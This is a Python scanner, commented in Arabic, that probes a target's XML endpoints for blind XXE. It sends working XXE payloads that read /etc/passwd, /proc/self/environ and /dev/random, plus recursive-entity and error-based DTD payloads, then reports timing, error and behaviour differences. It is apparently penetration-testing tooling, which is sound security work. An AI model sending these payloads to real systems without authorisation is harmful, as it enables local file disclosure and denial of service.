"""
Blind XXE Scanner
==================

يكتشف Blind XXE حيث لا يظهر الإخراج ولا يمكن استخدام OOB
يعتمد على:
- Time-based detection
- Error-based detection  
- Behavior analysis
"""

import time
import re
from typing import List, Dict, Optional
from urllib.parse import urljoin

try:
    from core.http_handler import HTTPHandler
    from core.response_analyzer import ResponseAnalyzer
    from core.logger import Logger
    from utils.validators import is_valid_url
except ImportError:
    class HTTPHandler:
        def __init__(self, *args, **kwargs): pass
        def send_request(self, *args, **kwargs): 
            return type('Response', (), {'status_code': 200, 'text': '', 'headers': {}, 'elapsed': type('Elapsed', (), {'total_seconds': lambda: 1})()})()
    
    class ResponseAnalyzer:
        def analyze(self, *args, **kwargs): return []
    
    class Logger:
        def info(self, msg): print(f"[INFO] {msg}")
        def success(self, msg): print(f"[✓] {msg}")
        def warning(self, msg): print(f"[!] {msg}")
        def error(self, msg): print(f"[✗] {msg}")
    
    def is_valid_url(url): return True


class BlindXXEScanner:
    """
    ماسح Blind XXE - يكتشف XXE بدون إخراج مباشر
    """
    
    def __init__(self, target: str, config: Optional[Dict] = None):
        """
        تهيئة الماسح
        
        Args:
            target: URL الهدف
            config: إعدادات مخصصة
        """
        self.target = target
        self.config = config or {}
        self.http = HTTPHandler()
        self.analyzer = ResponseAnalyzer()
        self.logger = Logger()
        
        # إعدادات
        self.timeout = self.config.get('timeout', 30)
        self.time_delay = self.config.get('time_delay', 5)  # ثواني للـ time-based
        self.max_tests = self.config.get('max_tests', 20)
        
        # نتائج
        self.vulnerabilities = []
        self.baseline_times = {}
    
    
    def scan(self) -> List[Dict]:
        """
        بدء فحص Blind XXE
        """
        self.logger.info(f"🔍 بدء فحص Blind XXE للهدف: {self.target}")
        
        # اكتشاف XML endpoints
        xml_endpoints = self._discover_xml_endpoints()
        self.logger.info(f"📡 تم اكتشاف {len(xml_endpoints)} XML endpoint")
        
        # قياس الوقت الأساسي لكل endpoint
        for endpoint in xml_endpoints:
            self._measure_baseline(endpoint)
        
        # اختبار كل endpoint
        for endpoint in xml_endpoints:
            self._test_blind_xxe(endpoint)
        
        # عرض النتائج
        self._display_results()
        
        return self.vulnerabilities
    
    
    def _discover_xml_endpoints(self) -> List[str]:
        """
        اكتشاف XML endpoints
        """
        endpoints = [self.target]
        
        common_paths = [
            '/api/xml', '/xml', '/soap', '/services',
            '/upload', '/import', '/parse', '/process'
        ]
        
        for path in common_paths:
            url = urljoin(self.target, path)
            if self._accepts_xml(url):
                endpoints.append(url)
        
        return endpoints
    
    
    def _accepts_xml(self, url: str) -> bool:
        """
        التحقق من قبول XML
        """
        try:
            simple_xml = '<?xml version="1.0"?><test>data</test>'
            response = self.http.send_request(
                url=url,
                method='POST',
                data=simple_xml,
                headers={'Content-Type': 'application/xml'},
                timeout=10
            )
            
            return response.status_code in [200, 201, 400, 500]
        except:
            return False
    
    
    def _measure_baseline(self, url: str):
        """
        قياس وقت الاستجابة الأساسي
        """
        self.logger.info(f"⏱️ قياس baseline لـ: {url}")
        
        times = []
        normal_xml = '<?xml version="1.0"?><test>data</test>'
        
        # 3 طلبات لحساب المتوسط
        for i in range(3):
            try:
                start = time.time()
                response = self.http.send_request(
                    url=url,
                    method='POST',
                    data=normal_xml,
                    headers={'Content-Type': 'application/xml'},
                    timeout=self.timeout
                )
                elapsed = time.time() - start
                times.append(elapsed)
                
            except Exception as e:
                self.logger.warning(f"  خطأ في قياس baseline: {str(e)}")
        
        if times:
            avg_time = sum(times) / len(times)
            self.baseline_times[url] = avg_time
            self.logger.info(f"  Baseline: {avg_time:.2f} ثانية")
    
    
    def _test_blind_xxe(self, url: str):
        """
        اختبار Blind XXE على endpoint
        """
        self.logger.info(f"🎯 اختبار Blind XXE: {url}")
        
        # 1. Time-based detection
        self._test_time_based(url)
        
        # 2. Error-based detection
        self._test_error_based(url)
        
        # 3. Behavior-based detection
        self._test_behavior_based(url)
        
        # 4. File existence detection
        self._test_file_existence(url)
    
    
    def _test_time_based(self, url: str):
        """
        اختبار Time-based Blind XXE
        """
        self.logger.info("  ⏱️ اختبار Time-based detection...")
        
        baseline = self.baseline_times.get(url, 1.0)
        
        # Payload يسبب تأخير (قراءة ملف كبير)
        time_payloads = [
            # قراءة /dev/random (يسبب تأخير)
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///dev/random">
]>
<foo>&xxe;</foo>''',
            
            # قراءة /proc/self/environ عدة مرات
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
]>
<foo>&xxe;&xxe;&xxe;&xxe;&xxe;</foo>''',
            
            # External DTD يسبب تأخير
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://127.0.0.1:9999/slow">
%xxe;
]>
<foo>test</foo>''',
        ]
        
        for i, payload in enumerate(time_payloads, 1):
            try:
                self.logger.info(f"    📤 إرسال time-based payload #{i}...")
                
                start = time.time()
                response = self.http.send_request(
                    url=url,
                    method='POST',
                    data=payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=self.timeout
                )
                elapsed = time.time() - start
                
                self.logger.info(f"    ⏱️ الوقت: {elapsed:.2f}s (Baseline: {baseline:.2f}s)")
                
                # إذا كان الوقت أطول بكثير من baseline
                if elapsed > (baseline + 3):
                    self.logger.success(f"    ✓ تأخير مكتشف! Blind XXE محتمل")
                    self._report_vulnerability(
                        url=url,
                        vuln_type='Blind XXE - Time-based',
                        payload=payload,
                        evidence=f"Response time: {elapsed:.2f}s (baseline: {baseline:.2f}s)",
                        severity='high',
                        confidence=75
                    )
                    return  # توقف بعد أول نجاح
                    
            except Exception as e:
                # Timeout قد يكون علامة على Blind XXE
                if 'timeout' in str(e).lower():
                    self.logger.success("    ✓ Timeout مكتشف! Blind XXE محتمل")
                    self._report_vulnerability(
                        url=url,
                        vuln_type='Blind XXE - Time-based (Timeout)',
                        payload=payload,
                        evidence=f"Request timeout: {str(e)}",
                        severity='high',
                        confidence=70
                    )
                    return
    
    
    def _test_error_based(self, url: str):
        """
        اختبار Error-based Blind XXE
        """
        self.logger.info("  ⚠️ اختبار Error-based detection...")
        
        # Payloads تسبب أخطاء مميزة
        error_payloads = [
            # Recursive entity
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe "&#x26;xxe;">
]>
<foo>&xxe;</foo>''',
            
            # Invalid file path في error message
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///this/path/does/not/exist/random123456">
]>
<foo>&xxe;</foo>''',
            
            # Malformed DTD
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY &#x26; content SYSTEM 'file:///nonexistent/%xxe;'>">
%error;
]>
<foo>&content;</foo>''',
        ]
        
        for i, payload in enumerate(error_payloads, 1):
            try:
                self.logger.info(f"    📤 إرسال error-based payload #{i}...")
                
                response = self.http.send_request(
                    url=url,
                    method='POST',
                    data=payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=self.timeout
                )
                
                # تحليل الأخطاء
                if self._analyze_error_response(response):
                    self._report_vulnerability(
                        url=url,
                        vuln_type='Blind XXE - Error-based',
                        payload=payload,
                        evidence=response.text[:500],
                        severity='high',
                        confidence=80
                    )
                    return
                    
            except Exception as e:
                self.logger.warning(f"    ⚠️ خطأ: {str(e)}")
    
    
    def _analyze_error_response(self, response) -> bool:
        """
        تحليل رسائل الخطأ للكشف عن XXE
        """
        error_indicators = [
            r'entity.*not defined',
            r'recursive entity',
            r'external entity',
            r'DOCTYPE',
            r'XML.*parse.*error',
            r'file.*not found.*etc/passwd',
            r'no such file.*random123456',
            r'permission denied.*etc',
        ]
        
        response_text = response.text.lower()
        
        for indicator in error_indicators:
            if re.search(indicator, response_text, re.IGNORECASE):
                self.logger.success(f"    ✓ Error indicator مكتشف: {indicator}")
                return True
        
        return False
    
    
    def _test_behavior_based(self, url: str):
        """
        اختبار Behavior-based detection
        """
        self.logger.info("  🔍 اختبار Behavior analysis...")
        
        # إرسال XML عادي
        normal_xml = '<?xml version="1.0"?><test>normal</test>'
        
        try:
            normal_response = self.http.send_request(
                url=url,
                method='POST',
                data=normal_xml,
                headers={'Content-Type': 'application/xml'},
                timeout=self.timeout
            )
            
            normal_status = normal_response.status_code
            normal_length = len(normal_response.text)
            
        except:
            return
        
        # إرسال XXE payload
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'''
        
        try:
            xxe_response = self.http.send_request(
                url=url,
                method='POST',
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=self.timeout
            )
            
            xxe_status = xxe_response.status_code
            xxe_length = len(xxe_response.text)
            
            # مقارنة السلوك
            status_changed = (normal_status != xxe_status)
            length_changed = abs(normal_length - xxe_length) > 100
            
            if status_changed or length_changed:
                self.logger.success("    ✓ تغير في السلوك مكتشف!")
                self.logger.info(f"      Normal: Status={normal_status}, Length={normal_length}")
                self.logger.info(f"      XXE: Status={xxe_status}, Length={xxe_length}")
                
                self._report_vulnerability(
                    url=url,
                    vuln_type='Blind XXE - Behavior-based',
                    payload=xxe_payload,
                    evidence=f"Behavior change detected: Status {normal_status}->{xxe_status}, Length {normal_length}->{xxe_length}",
                    severity='medium',
                    confidence=60
                )
                
        except Exception as e:
            self.logger.warning(f"    ⚠️ خطأ: {str(e)}")
    
    
    def _test_file_existence(self, url: str):
        """
        اختبار وجود الملفات عبر Blind XXE
        """
        self.logger.info("  📁 اختبار File existence detection...")
        
        # ملفات للاختبار
        test_files = {
            'exists': '/etc/passwd',  # موجود في Linux
            'not_exists': '/file/does/not/exist/random.txt'
        }
        
        responses = {}
        
        for file_type, file_path in test_files.items():
            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file://{file_path}">
]>
<foo>&xxe;</foo>'''
            
            try:
                response = self.http.send_request(
                    url=url,
                    method='POST',
                    data=payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=self.timeout
                )
                
                responses[file_type] = {
                    'status': response.status_code,
                    'length': len(response.text),
                    'text': response.text.lower()
                }
                
            except Exception as e:
                responses[file_type] = {'error': str(e)}
        
        # تحليل الفروقات
        if 'exists' in responses and 'not_exists' in responses:
            exists_resp = responses['exists']
            not_exists_resp = responses['not_exists']
            
            # مقارنة
            status_diff = exists_resp.get('status') != not_exists_resp.get('status')
            length_diff = abs(exists_resp.get('length', 0) - not_exists_resp.get('length', 0)) > 50
            
            if status_diff or length_diff:
                self.logger.success("    ✓ File existence detection ممكن!")
                self._report_vulnerability(
                    url=url,
                    vuln_type='Blind XXE - File Existence Detection',
                    payload='Multiple payloads tested',
                    evidence=f"Different responses for existing vs non-existing files",
                    severity='medium',
                    confidence=65
                )
    
    
    def _report_vulnerability(self, **kwargs):
        """
        تسجيل ثغرة مكتشفة
        """
        vuln = {
            'timestamp': time.time(),
            'scanner': 'Blind XXE Scanner',
            'cvss_score': 7.0 if kwargs.get('severity') == 'high' else 5.5,
            'cwe': 'CWE-611',
            **kwargs
        }
        
        self.vulnerabilities.append(vuln)
        self.logger.success(f"🔴 ثغرة مكتشفة: {kwargs.get('vuln_type')}")
    
    
    def _display_results(self):
        """
        عرض ملخص النتائج
        """
        self.logger.info("\n" + "="*60)
        self.logger.info("📊 ملخص نتائج فحص Blind XXE")
        self.logger.info("="*60)
        self.logger.info(f"🔴 ثغرات مكتشفة: {len(self.vulnerabilities)}")
        
        if self.vulnerabilities:
            self.logger.info("\n🔥 الثغرات المكتشفة:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                self.logger.info(f"\n  {i}. {vuln['vuln_type']}")
                self.logger.info(f"     URL: {vuln['url']}")
                self.logger.info(f"     Severity: {vuln['severity'].upper()}")
                self.logger.info(f"     Confidence: {vuln['confidence']}%")
                self.logger.info(f"     Evidence: {vuln['evidence'][:100]}...")
        else:
            self.logger.info("\n✅ لم يتم اكتشاف ثغرات Blind XXE")


# مثال على الاستخدام
if __name__ == "__main__":
    scanner = BlindXXEScanner("https://example.com")
    results = scanner.scan()
    
    print(f"\n\nتم اكتشاف {len(results)} ثغرة")